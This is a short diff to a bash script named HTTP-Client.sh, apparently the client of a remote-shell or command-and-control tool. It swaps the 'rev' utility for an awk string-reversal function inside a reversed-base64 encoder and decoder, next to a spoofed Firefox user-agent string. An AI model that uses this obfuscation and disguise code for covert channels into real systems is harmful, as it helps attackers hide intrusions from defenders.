@@ -10,6 +10,11 @@ sleeps="$4"
 pwdnew="$(echo $PWD)"
 cagent="Mozilla/6.4 (Windows NT 11.1) Gecko/2010102 Firefox/99.0"
 
+# Custom reverse function
+reverse() {
+    echo "$1" | awk '{ for(i=length;i!=0;i--) x=x substr($0,i,1);} END{print x}'
+}
+
 # Help
 if [[ $1 == *-h* ]] || [[ -z $2 ]]; then
    echo -e "\e[31m[!] Usage: ./HTTP-Client.sh -c [HOST:PORT] -s [SLEEP] (optional)\e[0m\n"
@@ -29,13 +34,13 @@ R64Encoder() {
    elif [ "$1" = "-f" ]; then
       base64=$(base64 "$2" | tr -d '\n' | tr "+/" "-_" | sed "s/=*$//")
    fi
-   revb64=$(echo "$base64" | rev)
+   revb64=$(reverse "$base64")
    echo "$revb64"
 }
 
 R64Decoder() {
    if [ "$1" = "-t" ]; then
-      base64=$(echo -n "$2" | rev | tr "-" "+" | tr "_" "/" )
+      base64=$(reverse "$2" | tr "-" "+" | tr "_" "/" )
       base64_len=$(( ${#base64} % 4 ))
       if [ "$base64_len" -eq 2 ]; then
          base64+="=="
